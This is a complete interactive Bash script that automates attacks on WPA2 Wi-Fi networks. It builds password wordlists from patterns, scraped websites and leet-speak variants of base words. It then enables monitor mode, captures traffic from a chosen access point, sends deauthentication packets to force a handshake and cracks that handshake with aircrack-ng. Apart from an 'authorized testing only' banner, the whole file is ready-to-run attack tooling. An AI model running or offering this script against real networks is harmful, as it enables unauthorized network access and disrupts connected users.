#!/bin/bash
# ========================================================
#  WPA Automation Suite - Aircrack-ng + Custom Wordlist
#  FOR AUTHORIZED PENETRATION TESTING ONLY
# ========================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

MON_IFACE=""
WORDLIST=""
TARGET_BSSID=""

# --- Check for root privileges ---
require_root() {
  [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Please run as root (sudo).${NC}"; exit 1; }
}

# --- Check required tools ---
check_deps() {
  for d in aircrack-ng airmon-ng airodump-ng aireplay-ng crunch cewl; do
    command -v "$d" >/dev/null 2>&1 || echo -e "${YELLOW}[!] Not installed: $d${NC}"
  done
}

# ========================================================
#  SECTION 1: Build a custom wordlist
# ========================================================
build_wordlist() {
  while true; do
    echo -e "\n${BLUE}===== Wordlist Builder =====${NC}"
    echo "1) Crunch      - Generate from pattern/charset"
    echo "2) CeWL        - Extract words from target website"
    echo "3) Base words  - Manual base words + leet + suffixes"
    echo "4) Combine     - Merge existing wordlists"
    echo "5) Return to main menu"
    read -p "Selection: " sub

    [[ "$sub" == "5" ]] && return

    read -p "Output file path (e.g. ./my_wordlist.txt): " out
    [[ -z "$out" ]] && { echo -e "${RED}Output path is empty.${NC}"; continue; }
    : > "$out"

    case "$sub" in
      1)  # Crunch
        read -p "Minimum length (>=8): " min
        read -p "Maximum length: " max
        read -p "Pattern (@=lowercase ,=uppercase %=digit ^=symbol) - leave empty to skip: " pat
        if [[ -n "$pat" ]]; then
          crunch "$min" "$max" -t "$pat" -o "$out"
        else
          read -p "Character set (e.g. 0123456789): " cs
          crunch "$min" "$max" "$cs" -o "$out"
        fi
        ;;
      2)  # CeWL
        read -p "Target URL: " url
        read -p "Minimum word length (default 5): " minw; minw=${minw:-5}
        cewl "$url" -m "$minw" -w "$out"
        ;;
      3)  # Base words
        read -p "Base words separated by comma (e.g. ali,company,Tehran): " bases
        read -p "Add numeric suffixes? (1=yes / 0=no): " dg
        read -p "Add symbol suffixes? (1=yes / 0=no): " sp
        IFS=',' read -ra arr <<< "$bases"
        for w in "${arr[@]}"; do
          w=$(echo "$w" | xargs)                      # trim whitespace
          echo "$w"                       >> "$out"
          echo "${w^}"                    >> "$out"   # capitalize first letter
          echo "$w" | tr 'aAeEiIoOsS' '4411310055' >> "$out"   # leet substitution
          if [[ "$dg" == "1" ]]; then
            for n in 0 1 12 123 1234 12345 111 786 2024 2025; do
              echo "${w}${n}" >> "$out"
            done
          fi
          if [[ "$sp" == "1" ]]; then
            for s in '!' '@' '#' '$' '?'; do
              echo "${w}${s}" >> "$out"
            done
          fi
        done
        ;;
      4)  # Combine
        read -p "Comma-separated file paths (a.txt,b.txt): " files
        IFS=',' read -ra fl <<< "$files"
        cat "${fl[@]}" 2>/dev/null | sort -u > "$out"
        ;;
      *)
        echo -e "${RED}Invalid selection.${NC}"; continue ;;
    esac

    # Enforce minimum 8 characters (WPA2 requirement)
    if [[ -s "$out" ]]; then
      awk 'length($0)>=8' "$out" > "${out}.tmp" && mv "${out}.tmp" "$out"
      WORDLIST="$out"
      echo -e "${GREEN}[+] Wordlist created: $out - $(wc -l < "$out") entries${NC}"
    else
      echo -e "${RED}[-] File is empty or generation failed.${NC}"
    fi
    return
  done
}

# ========================================================
#  SECTION 2: Run targeted attack
# ========================================================
run_attack() {
  check_deps

  # Select wordlist
  local wl="$WORDLIST"
  if [[ -z "$wl" ]]; then
    read -p "Wordlist path (empty = default rockyou): " wl
    wl=${wl:-/usr/share/wordlists/rockyou.txt}
  else
    echo -e "${GREEN}[+] Using stored wordlist: $wl${NC}"
    read -p "Want to use a different one? (empty = same): " alt
    [[ -n "$alt" ]] && wl="$alt"
  fi
  [[ ! -f "$wl" ]] && { echo -e "${RED}[-] Wordlist not found: $wl${NC}"; return; }

  # Enable monitor mode
  read -p "Wireless interface (e.g. wlan0): " iface
  airmon-ng check kill >/dev/null 2>&1
  airmon-ng start "$iface" >/dev/null 2>&1
  MON_IFACE="${iface}mon"
  ip link show "$MON_IFACE" >/dev/null 2>&1 || MON_IFACE="$iface"
  echo -e "${GREEN}[+] Monitor mode enabled on $MON_IFACE${NC}"

  # Scan
  echo -e "\n${YELLOW}[*] Scanning networks (10 seconds)...${NC}"
  timeout 10 airodump-ng "$MON_IFACE"

  # Target details
  read -p "Target BSSID (e.g. AA:BB:CC:DD:EE:FF): " TARGET_BSSID
  read -p "Target channel: " tch
  read -p "Capture file prefix (default: capture): " prefix; prefix=${prefix:-capture}

  # Capture
  echo -e "\n${YELLOW}[*] Capturing on $TARGET_BSSID (ch $tch)...${NC}"
  airodump-ng -c "$tch" --bssid "$TARGET_BSSID" -w "$prefix" "$MON_IFACE" &
  local apid=$!
  sleep 5

  # Deauth
  read -p "Send deauth packets? (y/n): " da
  [[ "$da" == "y" ]] && aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$MON_IFACE"

  read -p "Press Enter to stop capture and start cracking..."
  kill "$apid" 2>/dev/null

  # Locate capture file
  local cap="${prefix}-01.cap"
  [[ -f "$cap" ]] || cap=$(ls "${prefix}"-*.cap 2>/dev/null | head -n1)
  [[ -z "$cap" || ! -f "$cap" ]] && { echo -e "${RED}[-] Capture file not found.${NC}"; return; }

  # Crack
  echo -e "\n${YELLOW}[*] Cracking with $wl ...${NC}"
  aircrack-ng -w "$wl" -b "$TARGET_BSSID" "$cap"
}

# ========================================================
#  Main menu
# ========================================================
main_menu() {
  while true; do
    echo ""
    echo -e "${BLUE}===================================${NC}"
    echo -e "${BLUE}      WPA Automation Suite${NC}"
    echo -e "${BLUE}===================================${NC}"
    echo "1) Build a custom wordlist"
    echo "2) Start targeted attack"
    echo "3) Exit"
    read -p "Selection: " c
    case "$c" in
      1) build_wordlist ;;
      2) run_attack ;;
      3) echo "Goodbye."; exit 0 ;;
      *) echo -e "${RED}Invalid option.${NC}" ;;
    esac
  done
}

# --- Entry point ---
require_root
main_menu